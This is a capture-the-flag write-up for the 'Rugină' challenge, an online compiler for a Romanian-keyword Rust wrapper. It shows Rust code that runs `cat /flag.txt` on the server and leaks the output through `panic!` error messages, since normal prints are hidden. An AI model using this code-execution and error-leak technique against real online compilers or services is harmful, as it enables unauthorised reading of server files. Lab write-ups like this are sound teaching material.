rugina

Aren't you tired of rust? I found the perfect solution for you! Welcome to Rugină. Since there is no compiler for it yet, I made one for you.

- On this one we check the [rugina](https://github.com/aionescu/rugina/tree/principal) repository on github, but we saw is a wrapper for Rust. In that case we tried some normal rust code which we found out that worked.

- First you need to add the function Principal for the compiler to work.

```rust
principal() {

}
```

![rugina-principal](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/Rugina/rugina-principal.png)

- After we manage to create some code that worked, but we saw that wasn't printing anything

```rust
principal() {
    let output = std::process::Command::new("cat").arg("/flag.txt").output().unwrap().stdout;
    let output_str = String::from_utf8(output).unwrap_or_default();
    scrie!("{}", output_str.trim());
}
```

![rugina-println](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/Rugina/rugina-println.png)

- We analyze the repository again to check if we made some mistakes, but we didn't. Some time passed and one of us pointed out that "only the errors are shown and not the normal print". In that case we changed from a normal println to panic and in that moment worked.

```rust
principal() {
    let output = std::process::Command::new("cat").arg("/flag.txt").output().unwrap().stdout;
    let output_str = String::from_utf8(output).unwrap_or_default();
    panic!("{}", output_str.trim());
}
```

![rugina-flag](https://github.com/TedyonGit/AC-UPT-ControluDeCalitate-WriteUps/blob/main/Rugina/rugina-flag.png)

- And this is how we got the flag out
